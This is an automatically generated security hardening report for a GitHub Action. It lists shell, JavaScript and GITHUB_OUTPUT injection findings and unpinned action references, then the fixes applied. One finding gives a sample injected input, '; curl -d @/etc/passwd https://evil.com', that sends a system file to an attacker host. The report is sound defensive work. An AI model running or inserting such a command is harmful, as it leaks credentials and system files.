<!-- markdownlint-disable -->

# Hardening Report: dev-vikas-soni--gradle-lighthouse/v2.1.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **dev-vikas-soni--gradle-lighthouse/v2.1.1** was hardened automatically. 6 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): Two user-controlled inputs are interpolated directly inside a `run:` shell command string without going through an env var. `${{ inputs.fail-on-severity }}` is passed as a Gradle property value and `${{ inputs.gradle-args }}` is expanded directly on the command line. An attacker who controls these inputs (e.g. via `workflow_dispatch` or a calling workflow) can inject arbitrary shell commands. Example: `inputs.gradle-args: "; curl -d @/etc/passwd https://evil.com"`.

Locations:

- `action.yml:30`
- `action.yml:31`

### script-injection (severity: high)

Sub-rule (a): `${{ steps.reports.outputs.score }}` is interpolated directly into the `script:` body of `actions/github-script`. The expression is substituted by the Actions template engine before the JavaScript is evaluated, so a newline or quote character in the step output can break out of the string literal `'${{ steps.reports.outputs.score }}'` and inject arbitrary JavaScript. The `score` output is written from a `grep … || echo "N/A"` pipeline, but the output is not sanitized before being written to `$GITHUB_OUTPUT`, making this a viable injection path.

Locations:

- `action.yml:59`

### github-env-injection (severity: high)

The `Find SARIF reports` step writes `REPORT_FILES` — the output of `find`, which can include filenames containing newline characters — directly to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). A repository with a crafted filename could inject additional key=value pairs into `$GITHUB_OUTPUT`, poisoning subsequent steps' outputs.

Locations:

- `action.yml:47`

### unpinned-uses (severity: high)

Two `uses:` references in action.yml use mutable version tags instead of immutable 40-character commit SHA digests, making the action vulnerable to supply-chain attacks if the referenced tag is moved or the upstream repository is compromised:
- `github/codeql-action/upload-sarif@v4` (line 37)
- `actions/github-script@v9` (line 55)
These should be pinned to their full SHA, e.g. `uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7`.

Locations:

- `action.yml:37`
- `action.yml:55`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.fail-on-severity }}" appears directly in run: block of step "Run Lighthouse Audit"; move to env: map

Locations:

- `action.yml:32`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.gradle-args }}" appears directly in run: block of step "Run Lighthouse Audit"; move to env: map

Locations:

- `action.yml:33`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, github-env-injection, unpinned-uses

**Notes:**

Fixed all 6 findings in hardened/action/action.yml:
1. script-injection/static-inline-injection: Moved inputs.fail-on-severity and inputs.gradle-args from run: block into env: map (FAIL_ON_SEVERITY, GRADLE_ARGS). GRADLE_ARGS is tokenized via xargs into a bash array to handle quoted sub-commands safely.
2. github-env-injection: Sanitized REPORT_FILES and SCORE with `tr -d '\n\r'` before writing to $GITHUB_OUTPUT. Also quoted $GITHUB_OUTPUT path.
3. script-injection in github-script: Moved steps.reports.outputs.score out of the script: body into the step's env: block as LIGHTHOUSE_SCORE; JavaScript reads it via process.env.LIGHTHOUSE_SCORE.
4. unpinned-uses: Pinned github/codeql-action/upload-sarif@v4 to SHA d1ba80a13dd99fba24a470575428917156a28b43 and actions/github-script@v9 to SHA 3a2844b7e9c422d3c10d287c895573f7108da1b3.

### Iteration 2

**Fixes applied:** unpinned-uses, missing-permissions, script-injection

**Notes:**

1. unpinned-uses: Pinned all action references in lighthouse-ci.yml and publish-plugin.yml to full 40-char SHAs (actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803, actions/setup-java@b6effb05e454b25005698d916606bdc6ffcbf961, gradle/actions/setup-gradle@9c971963bec38e04b3d30dcc455b5382be2fdbfb, gradle/actions/wrapper-validation@9c971963bec38e04b3d30dcc455b5382be2fdbfb), preserving version tags in comments.
2. missing-permissions: Added top-level `permissions: {}` to both workflow files and `permissions: { contents: read }` to each job.
3. script-injection: Added a `case` statement in action.yml's 'Run Lighthouse Audit' step to validate $FAIL_ON_SEVERITY against the allowed set (NONE|INFO|WARNING|ERROR|FATAL) before it is interpolated into the Gradle property argument, preventing injection via crafted values. The GRADLE_ARGS xargs tokenization pattern is retained as it is the recommended approach for list inputs.

